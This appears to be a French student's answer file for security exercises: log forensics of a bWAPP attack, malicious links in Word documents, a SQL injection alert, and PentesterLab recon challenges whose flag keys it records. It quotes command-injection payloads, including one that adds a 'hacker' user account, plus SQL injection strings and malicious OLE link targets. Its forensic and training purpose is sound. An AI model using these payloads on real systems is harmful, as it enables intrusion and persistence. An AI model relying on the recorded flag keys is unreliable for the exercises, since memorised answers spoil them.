# D34 - Fichier de réponses

## Case 01 

### 1. Quel outil a été utilisé pendant la phase de reconnaissance (scan) ?

192.168.199.2 - - [20/Jun/2021:12:36:26 +0300] "HEAD /bwapp/192.168.tar.lzma HTTP/1.1" 404 - "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)"

HEAD /bwapp/... HTTP/1.1 est la requête elle-même. Une requête HEAD est une méthode qui demande une réponse identique à celle d'une requête GET, mais sans le corps de la réponse. C'est-à-dire, il demande seulement les en-têtes de réponse. Cela peut être utilisé pour récupérer les métadonnées d'un document ou vérifier si un document existe sans télécharger le document lui-même. Les chemins après le /bwapp/ sont les chemins d'accès que le demandeur essayait d'accéder. Cela semble indiquer une tentative d'accéder à des fichiers ou des répertoires potentiellement sensibles.

Dans l'ensemble, il semble que quelqu'un ait effectué un scan de sécurité ou une tentative de recherche de vulnérabilités sur votre serveur web en utilisant Nikto.

### 2. Après la phase de reconnaissance, quelle technique a été utilisée pour découvrir la liste des répertoires accessibles sur le serveur web ?
L'attaquant a utilisé un outil de scrapping pour extraire les informations des pages web.

### 3. Après la fin de la phase de découverte des répertoires, de quel type d'attaque l'application est-elle la cible ?

1. une attaque par brute force sur le serveur : directory listing (correspond à la phase de découverte).
2. une attaque par injection de code PHP.
3. une attaque par brute force sur le login pour se connecter
4. une attaque d'injection de commande pour vérifier le nom de l'utilisateur connecté:  
   192.168.199.2 - - [20/Jun/2021:12:52:36 +0300] "GET /bWAPP/phpi.php?message=%22%22;%20system(%27whoami%27) HTTP/1.1" 200 12778 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
5. une attaque pour voir tous les utilisateurs:  
   192.168.199.2 - - [20/Jun/2021:12:52:46 +0300] "GET /bWAPP/phpi.php?message=%22%22;%20system(%27net%20user%27) HTTP/1.1" 200 13045 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
6. une attaque qui affiche tous les partages de fichiers:  
   192.168.199.2 - - [20/Jun/2021:12:52:56 +0300] "GET /bWAPP/phpi.php?message=%22%22;%20system(%27net%20share%27) HTTP/1.1" 200 13175 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
7. une attaque qui ajoute un nouvel utilisateur nommé "hacker" avec le mot de passe "Asd123":  
   192.168.199.2 - - [20/Jun/2021:12:53:23 +0300] "GET /bWAPP/phpi.php?message=%22%22;%20system(%27net%20user%20hacker%20Asd123!!%20/add%27) HTTP/1.1" 200 12755 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"

### 4. Cette dernière attaque a-t-elle fonctionné ou a-t-elle échoué ?
A la ligne 12548, on voit que le hacker accède au portail, il a donc réussi à se connecter:  
192.168.199.2 - - [20/Jun/2021:12:50:10 +0300] "GET /bWAPP/portal.php HTTP/1.1" 200 23369 "http://192.168.199.5/bWAPP/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"

Il faudrait vérifier en base de donnée pour savoir si la dernière attaque qui tente d'ajouter un nouvel utilisateur nommé "hacker" avec le mot de passe "Asd123" a fonctionné.   
Sur le fichier des logs que le serveur a donné un code 200 à la requête.

### 5. Quel est le type de la quatrième attaque (son nom) et à quelle heure débute-t-elle ?
La quatrième attaque semble exploiter une vulnérabilité d'Injection de Code, spécifiquement une Injection de Commandes Shell.
Elle a lieu à 12:52:36

### 6. Quelle est la charge malveillante (payload) utilisée en premier lors de la quatrième attaque ?
La charge malveillante est "%22%22;%20system(%27whoami%27)".  
Cette charge malveillante est URL encodée, si nous la décodons, elle donne : ""; system('whoami').
Cela signifie qu'après un vide ("";), la fonction system est utilisée pour exécuter la commande whoami sur le serveur.  
La commande whoami est une commande Unix qui renvoie le nom de l'utilisateur courant du système. Si le script phpi.php est vulnérable à l'injection de commandes et que la commande est exécutée, l'attaquant pourrait obtenir le nom de l'utilisateur courant du serveur, ce qui pourrait lui fournir des informations utiles pour des attaques ultérieures.

### 7. Y'a-t-il une trace démontrant la persistance de l'attaque ? si oui, quelle est la charge malveillante (payload) utilisée ?
Oui, lorsqu'il tente d'ajouter un utilisateur nommé "hacker" avec le mot de passe "Asd123".  
Le payload est "%22%22;%20system(%27net%20user%20hacker%20Asd123!!%20/add%27)".
Une fois décodée de son format URL encodé, la charge est ""; system('net user hacker Asd123!! /add').  
Cette charge malveillante tente d'utiliser la fonction system pour exécuter la commande net user hacker Asd123!! /add sur le serveur. Cette commande est une commande Windows qui crée un nouvel utilisateur sur le système avec le nom "hacker" et le mot de passe "Asd123!!". Si le script phpi.php est vulnérable à l'injection de commandes et que la commande est exécutée, l'attaquant pourrait créer un nouvel utilisateur sur le système, ce qui pourrait lui donner un accès supplémentaire au système.

Si l'attaque a fonctionné on devrait voir ce nouvel utilisateur dans la base de données.

### 8. Quels sont les actions à entreprendre avant la remise en ligne de l’application ?
1. Correction des vulnérabilités :  
   La première étape consiste à corriger toutes les vulnérabilités connues qui ont été exploitées dans l'attaque. Cela peut impliquer la mise à jour de logiciels, la réparation de code personnalisé ou la modification des configurations de sécurité. Si possible, il est également recommandé d'effectuer un audit de sécurité complet pour découvrir et corriger toute autre vulnérabilité potentielle.

2. Nettoyage du système :  
   Si l'attaquant a réussi à exécuter du code malveillant ou à créer des comptes d'utilisateur sur le système, il est nécessaire de nettoyer ces modifications. Cela peut impliquer la suppression de comptes d'utilisateur non autorisés, le nettoyage du code malveillant ou la restauration du système à partir d'une sauvegarde connue pour être sûre.

3. Analyse de l'incident :  
   Il est important de comprendre comment l'attaque s'est produite et quelles étaient ses conséquences. Cela peut aider à prévenir des attaques similaires à l'avenir et à améliorer la réponse aux incidents. Cette analyse peut impliquer l'examen des journaux du système, l'analyse des payloads d'attaque et la consultation avec des experts en sécurité.

4. Amélioration de la surveillance et des défenses :  
   Après une attaque, il peut être judicieux de renforcer la surveillance du système et les défenses de sécurité. Cela peut impliquer l'installation de systèmes de détection d'intrusion, l'amélioration des journaux et des alertes de sécurité, et la mise en œuvre de mesures de sécurité supplémentaires comme le pare-feu ou le système de prévention des intrusions.

5. Test de pénétration :  
   Avant de remettre l'application en ligne, un test de pénétration devrait être effectué pour s'assurer que les vulnérabilités ont été correctement traitées et que l'application est sécurisée contre les futures attaques.

---

## Case 02

### 1. Quelle est l'adresse IP malveillante utilisée dans le fichier Employees_Contact_Audit_Oct_2021.docx ?
En utilisant virustotal.com, on peut voir que l'adresse IP malveillante est :  
175.24.190.249
### 2. Quel est le nom de domaine malveillant utilisé dans le fichier Employee_W2_Form.docx file ?
 1. unzip fichier word:  
    unzip "/media/sf_D34-material/Case02/files/Employee_W2_Form.docx" -d output_folder
2. je consulte ensuite le fichier document.xml.rels qui se trouve output_folder créé à l'étape précedente et qui est utilisé par word pour organiser les liens entre le document principal et les autres ressources incorporées ou liées.  
Dans ce fichier, je trouve la ligne suivante qui indique un lien externe vers le domaine **arsenal.30cm.tw**:
```xml
<Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:arsenal.30cm.tw:1212/word.html!x-usc:arsenal.30cm.tw:1212/word.html" TargetMode="External"/>
```
### 3. Quel est le nom de domaine malveillant utilisé dans le fichier Examing the Work_From_Home_Survey.doc ?
En utilisant la même méthode qu'à la question précédente, je trouve le lien externe suivant qui pointe vers le domaine **trendparlye.com**:  
```xml
<Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://trendparlye.com/wiki0509.html!x-usc:http://trendparlye.com/wiki0509.html" TargetMode="External"/>
```
### 4. Quel est le nom de domaine malveillant utilisé dans le fichier income_tax_and_benefit_return_2021.docx ? 
je n'ai pas reçu ce fichier...  
### 5. Quelle est la vulnérabilité technique exploitée dans cet incident ? 
attaque de fishing ou d'hameçonnage via des liens incorporés malveillants.
### 6. Quelle(s) solution(s) technique(s) proposes-tu au niveau du back-office de l'application pour prévenir ce type d'incident ? Quel pourrait-être le coût de mise en oeuvre, sachant que nous traitons environ 40Go de documents uploadés par mois ?
   1. Scanner les documents pour les logiciels malveillants :  
      Utilisez un logiciel antivirus ou antimalware pour analyser tous les documents qui sont téléchargés sur votre site. Cela peut aider à identifier et à bloquer les logiciels malveillants avant qu'ils n'atteignent vos utilisateurs.

   2. ##### Filtrage de contenu :  
      Vous pouvez utiliser des outils de filtrage de contenu pour détecter et bloquer des contenus potentiellement malveillants dans les documents téléchargés.

   3. ##### Sandboxing :  
      Les fichiers peuvent être ouverts et exécutés dans un environnement isolé (sandbox) pour identifier les comportements malveillants.

   4. ##### Contrôle strict des types de fichiers :  
      Restreignez les types de fichiers que les utilisateurs peuvent télécharger à ceux qui sont strictement nécessaires pour votre entreprise.

   5. ##### Mise en œuvre de WAF (Web Application Firewall) :  
      Un WAF peut aider à bloquer les attaques au niveau de l'application en surveillant le trafic HTTP vers et depuis votre application.

   6. ##### Mise en place de l'analyse des journaux d'événements :
      Les outils d'analyse des journaux peuvent aider à détecter les comportements suspects ou les tentatives d'attaque et à alerter l'équipe de sécurité en conséquence.
---

## Case 03

#### 1. L’adresse IP source est-elle connue pour être source d’activités malveillantes ?

Le site www.virustotal.com,  indique que cette adresse IP a été marquée comme malveillante par 8 fournisseurs de sécurité, ce qui suggère qu'elle a été utilisée pour des activités malveillantes dans le passé. L'AS (Autonomous System) 14061 est associé à DigitalOcean, un fournisseur de services cloud. Cela signifie que l'attaquant a peut-être loué une instance de serveur sur DigitalOcean pour mener l'attaque.

#### 2. Comment penses-tu procéder pour évaluer la portée de l’attaque sur l’application (réussite ou non, effets constatés, conséquences,…) ? Décris la méthode et les outils utilisés.

En plus de l'adresse IP source, l'alerte SIEM fournit plusieurs autres informations précieuses qui peuvent aider à comprendre l'attaque potentielle :

- **Type d'attaque :** Le nom de la règle "Possible SQL Injection Payload Detected" indique que l'attaque est probablement une tentative d'injection SQL. L'injection SQL est une technique d'attaque courante qui tente d'exploiter des failles dans une application web pour manipuler ou extraire des données d'une base de données backend.

  - **Méthode HTTP Request :** L'alerte indique que la méthode GET a été utilisée pour l'attaque. Les attaques d'injection SQL peuvent souvent être réalisées via des paramètres GET dans l'URL d'une requête HTTP.

  - **URL demandée :** L'URL demandée fournit le vecteur d'attaque spécifique utilisé. En particulier, la chaîne de requête dans l'URL, "?q=%22%20OR%201%20%3D%201%20--%20-", est une tentative d'injection SQL classique. En décodant cette URL, nous obtenons ?q=" OR 1 = 1 -- -, qui est une commande SQL qui tentera de retourner toutes les entrées d'une base de données si elle est mal gérée par l'application.

  - **User-Agent :** L'en-tête User-Agent peut fournir des informations sur le système d'exploitation et le navigateur utilisés par l'attaquant. Dans ce cas, il semble que l'attaquant utilise Firefox 40.1 sur Windows 7. Cependant, il est important de noter que les en-têtes User-Agent peuvent être facilement falsifiés, donc cette information n'est pas nécessairement fiable.

  - **Hostname et Destination IP Address :** Ces informations peuvent aider à identifier le serveur ou l'application qui a été ciblée par l'attaque.

  - **Device Action: Allowed :** Cela indique que la requête a été autorisée à atteindre l'application web. C'est une indication que le système de sécurité n'a pas bloqué cette requête malgré l'alerte déclenchée, ce qui nécessite une enquête plus approfondie.

  - **Severity: High :** Cela indique que le système a jugé cette tentative comme ayant un potentiel de dommages élevé, probablement en raison de la règle déclenchée et du type d'attaque détecté.

Pour creuser plus en détail et comprendre l'impact réel de cette attaque potentielle, on pourrait envisager :

   1. Analyse des journaux du serveur web et de l'application : Vérifiez si l'attaque a été suivie d'autres activités suspectes. Y a-t-il eu d'autres tentatives d'injection SQL à partir de la même adresse IP ? Y a-t-il eu des erreurs inhabituelles retournées par le serveur ou l'application ?

   2. Vérification de la vulnérabilité : Examinez le code de l'application où l'entrée utilisateur est utilisée dans une requête SQL (comme dans l'URL de recherche). L'application est-elle vulnérable à l'injection SQL ? Si c'est le cas, cela indique un risque potentiel plus élevé.

   3. Analyse de la base de données : Si vous suspectez qu'une injection SQL a été réussie, vous devrez examiner votre base de données. Vérifiez s'il y a des modifications inhabituelles dans les données ou les schémas. Il peut être utile d'utiliser des outils spécifiques à la base de données pour cela, comme MySQL Workbench pour MySQL ou pgAdmin pour PostgreSQL.

   4. Analyse de l'activité réseau : Utilisez des outils de surveillance réseau pour voir s'il y a eu une activité réseau suspecte en provenance ou à destination de votre serveur. Cela pourrait inclure une quantité inhabituelle de trafic, des connexions à des heures inhabituelles, etc.

   5. Analyse des artefacts : Si vous suspectez qu'une attaque a réussi, vous pouvez également examiner les artefacts laissés par l'attaquant. Cela pourrait inclure des fichiers malveillants téléchargés sur votre serveur, des modifications des fichiers du système ou de l'application, des processus malveillants en cours d'exécution, etc.

   6. Analyse de l'incident : Si vous identifiez que l'attaque a été réussie, il sera important de comprendre comment l'attaquant a réussi à exploiter votre système, quels dommages ont été causés et comment prévenir de futurs incidents. Cela peut impliquer une analyse en profondeur de l'incident, potentiellement avec l'aide d'une équipe de réponse aux incidents ou d'un consultant en sécurité.

#### 3. Considérant que l’application est vulnérable à ce type d’attaque, propose plusieurs solutions techniques (complémentaires) à implémenter afin de corriger ce type de faille et renforcer l’application.
   La correction d'une faille d'injection SQL et le renforcement d'une application pour prévenir ce type de vulnérabilité peuvent être abordés de plusieurs manières. Voici plusieurs solutions techniques que l'on pourrait envisager :
   
   **Paramétrage des requêtes SQL :** La meilleure façon de prévenir les attaques par injection SQL est de n'accepter que des paramètres SQL strictement contrôlés. Cela peut être réalisé en utilisant des requêtes SQL préparées ou paramétrées, des procédures stockées et en évitant la concaténation de chaînes pour construire les requêtes SQL.
   
   **Validation des entrées :** Toutes les entrées des utilisateurs doivent être validées avant d'être utilisées dans une requête SQL. Cela peut inclure la vérification du type, de la longueur, du format et du contenu. Les données qui ne passent pas la validation ne doivent pas être acceptées.
   
   **Échappement des entrées :** Si vous devez utiliser les entrées des utilisateurs dans vos requêtes SQL, assurez-vous qu'elles sont correctement échappées. Cela empêchera les caractères spéciaux d'affecter la syntaxe de votre requête SQL.
   
   **Utilisation du principe du moindre privilège :** Les comptes de base de données utilisés par l'application ne doivent avoir que les privilèges minimales nécessaires pour fonctionner. Cela peut limiter les dégâts en cas d'injection SQL réussie.
   
   **Utilisation d'un pare-feu d'application Web (WAF) :** Un WAF peut aider à bloquer les tentatives d'injection SQL en filtrant le trafic HTTP/HTTPS entrant à la recherche de tentatives d'injection SQL.
   
   **Patchs et mises à jour régulières :** Assurez-vous que votre serveur de base de données et votre environnement d'application sont régulièrement mis à jour avec les derniers patchs de sécurité.
   
   **Révision du code et tests de pénétration :** Réaliser des audits de code réguliers pour détecter d'éventuelles vulnérabilités et effectuer des tests de pénétration pour identifier les points faibles de l'application.  
   
   **Logging et surveillance :** Enfin, assurez-vous que vous disposez de journaux appropriés et de systèmes de surveillance pour détecter rapidement toute tentative d'injection SQL.

---

## Case 04

### 1. Réponse : 
https://hackycorp.com/robots.txt  
robots.txt  
af9c328a-02b4-439d-91c6-f46ab4a0835b

### 2. Réponse : 
lorsque je vais sur une page qui n'existe pas (erreur 404) j'obtiens la clé recon-01:  
404 page! You solved recon_01  
The key for this challenge is: aeaee57f-2a82-41da-bc4c-d081c8cddfc8

### 3. Réponse : 
https://hackycorp.com/.well-known/security.txt  
\# Please don't report any security issue for this site  
\# This is a recon challenge and the key for this exercise is  
\# 99685e30-7061-4ac0-83bf-4ccc0409faac  

### 4. Réponse : 
https://hackycorp.com/images/key.txt  
Nice find! You solved recon_03  
The key for this challenge is 93790afa-6985-47fd-b564-aa7ba59ed6a9

### 5. Réponse : 
https://hackycorp.com/admin/  
Well done! You solved recon_04  
The key for this exercise is: ad1d44d6-ab73-4640-8291-c5bf2343e2a5

### 6. Réponse : 
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://hackycorp.com/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

:: Method           : GET  
:: URL              : https://hackycorp.com/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,204,301,302,307,401,403,405,500  
________________________________________________

[Status: 200, Size: 16011, Words: 5888, Lines: 278, Duration: 47ms]
* FUZZ:

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 143ms]
* FUZZ: admin

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 93ms]
* FUZZ: images

[Status: 200, Size: 16011, Words: 5888, Lines: 278, Duration: 98ms]
* FUZZ: index.html

[Status: 200, Size: 121, Words: 14, Lines: 7, Duration: 95ms]
* FUZZ: robots.txt

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 120ms]
* FUZZ: startpage

=> https://hackycorp.com/startpage  
It works! You solved recon_05  
The key for this exercise is: 498621b0-17fe-4ebb-8324-3de7743fea51

### 7. Réponse : 
dig +short hackycorp.com  
51.158.147.132

┌──(axl㉿DESKTOP-795T47Q)-[~]  
└─$ curl -H "Host: randomhost" http://51.158.147.132  
Well done! You solved recon_06  
The key for this exercise is 5cf83b5d-eb6c-4eee-af6c-945f9aed8dfd  

### 8. Réponse : 
curl -k -H "Host: rando" https://51.158.147.132  
Well done! You solved recon_07   
The key for this exercise is 23eafa56-6d55-4b78-8307-24e7dc2ce5e6

### 9. Réponse : 
curl -I http://hackycorp.com  
HTTP/1.1 200 OK  
Server: nginx  
Date: Fri, 26 May 2023 15:06:23 GMT  
Content-Type: text/html  
Content-Length: 16011  
Last-Modified: Tue, 31 Mar 2020 03:12:16 GMT  
Connection: keep-alive  
ETag: "5e82b510-3e8b"  
pentesterlab_recon_09: 99d0738b-1e52-4a00-8885-b15894b2c79e  
Accept-Ranges: bytes  
### 10. Réponse : 
echo | openssl s_client -servername hostname -connect hackycorp.com:443 2>/dev/null | openssl x509 -noout -text | grep DNS:  
DNS:66177e3f25e3ea0713807b1dc5f0b9df.hackycorp.com, DNS:hackycorp.com, DNS:www.hackycorp.com  

=>  
montre trois noms de domaine couverts par le certificat SSL de hackycorp.com :  
 - "66177e3f25e3ea0713807b1dc5f0b9df.hackycorp.com"
 - "hackycorp.com"  
 - "www.hackycorp.com". 

Cela signifie que le certificat SSL peut être utilisé pour sécuriser les connexions à ces trois domaines.  

cela peut présenter des problèmes de sécurité dans certains contextes :  

Révélation d'informations : Les noms de domaine listés dans le certificat peuvent révéler des informations sur l'infrastructure du serveur ou sur les applications et services hébergés, qui pourraient être exploités par un attaquant.

Hébergement de contenu malveillant : Si le certificat est mal configuré ou si le contrôle des sous-domaines est faible, un attaquant pourrait être en mesure d'héberger du contenu malveillant sous un sous-domaine valide couvert par le certificat. Cela pourrait tromper les utilisateurs et les systèmes de sécurité en leur faisant croire que le contenu est digne de confiance.

Mauvaise configuration : Si un sous-domaine listé dans le certificat n'est pas correctement sécurisé, il pourrait être exploité pour attaquer le domaine principal ou d'autres sous-domaines sécurisés par le même certificat.

Ainsi, bien que la présence de noms de domaine supplémentaires dans le champ SAN ne soit pas une faille de sécurité, elle peut révéler des informations et ouvrir des vecteurs d'attaque si la configuration et la gestion du serveur et des sous-domaines ne sont pas effectuées de manière appropriée.

### 11. Réponse : 
la clé rouge se trouve à l'adresse: http://0x81.a.hackycorp.com/  
"The key is 483f8b15-e4a8-4387-b052-4b2204c7eb69"
### 12. Réponse : 
### 13. Réponse : 
### 14. Réponse : 
### 15. Réponse : 
### 16. Réponse : 
### 17. Réponse : 
### 18. Réponse : 
### 19. Réponse : 
### 20. Réponse : 
### 21. Réponse : 
### 22. Réponse : 
### 23. Réponse : 
### 24. Réponse : 
### 25. Réponse : 
### 26. Listes d'actions à entreprendre pour sécuriser le workflow de développement : 
